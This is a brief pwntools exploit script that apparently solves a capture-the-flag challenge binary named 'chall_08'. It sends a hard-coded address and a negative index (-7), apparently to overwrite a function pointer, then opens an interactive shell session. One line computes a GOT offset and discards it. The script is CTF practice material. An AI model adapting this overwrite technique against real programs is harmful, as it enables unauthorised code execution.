# coding: utf-8
from pwn import *
def exploit():
    proc= process("./chall_08")
    elf=ELF("./chall_08")
    elf.got.puts-elf.sym.target
    proc.sendline("4198950")
    proc.sendline("-7")
    proc.interactive()
    proc.close()
    
exploit()
